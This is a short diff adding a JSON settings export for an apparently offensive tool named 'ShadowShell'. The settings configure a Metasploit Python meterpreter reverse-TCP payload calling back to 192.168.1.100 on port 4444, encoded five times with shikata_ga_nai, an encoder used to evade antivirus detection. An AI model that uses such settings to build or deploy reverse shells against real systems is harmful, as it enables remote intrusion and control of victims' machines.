@@ -1,0 +1,15 @@
+{
+  "metadata": {
+    "version": "2.0",
+    "exported_at": "2025-07-31T13:31:18.923282",
+    "tool": "ShadowShell"
+  },
+  "config": {
+    "ip": "192.168.1.100",
+    "port": 4444,
+    "use_msf": true,
+    "msf_payload": "python/meterpreter/reverse_tcp",
+    "msf_encoder": "x86/shikata_ga_nai",
+    "msf_iterations": 5
+  }
+}
